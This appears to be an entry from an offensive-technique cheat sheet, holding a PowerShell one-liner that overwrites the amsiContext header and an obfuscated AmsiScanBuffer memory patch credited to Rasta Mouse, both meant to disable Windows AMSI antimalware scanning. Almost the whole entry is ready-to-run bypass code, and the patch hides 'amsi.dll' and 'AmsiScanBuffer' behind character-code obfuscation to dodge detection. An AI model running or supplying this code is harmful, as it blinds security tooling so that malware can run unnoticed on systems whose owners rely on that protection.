---
description: |
  One-liner to bypass the AMSI in a Powershell. Done by overwriting the amsiContext header by copying data (four zeros) from managed to unmanaged memory. When the context structure header is overwritten, this should force AmsiOpenSession to error out. The additional code is Rasta Mouse's memory patch to bypass AMSI, run the one-liner and the additional code to disable AMSI in powershell.

  Command Reference:
  ```
  loop the GetTypes method, searching for all types containing the string “iUtils” in its name

  GetFields accepts filtering modifiers, we’ll apply the NonPublic and Static filters to help narrow the results

  loop through all the fields, searching for a name containing “Context”, as this does not be marked as malicious looking for the amsiContext

  use Copy to overwrite the amsiContext header by copying data (four zeros) from managed to unmanaged memory
  ```
command: |
  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

code: | 
  #Rasta-mouses Amsi-Scan-Buffer patch \n
  $kizax = @"
  using System;
  using System.Runtime.InteropServices;
  public class kizax {
      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);
      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);
  }
  "@

  Add-Type $kizax

  $rykogwu = [kizax]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))")
  $iyslea = [kizax]::GetProcAddress($rykogwu, "$(('ÃmsîScân'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))")
  $p = 0
  [kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)
  $aapt = "0xB8"
  $qkwf = "0x57"
  $snxi = "0x00"
  $wnan = "0x07"
  $nchj = "0x80"
  $yywa = "0xC3"
  $estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
  [System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)


items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4
---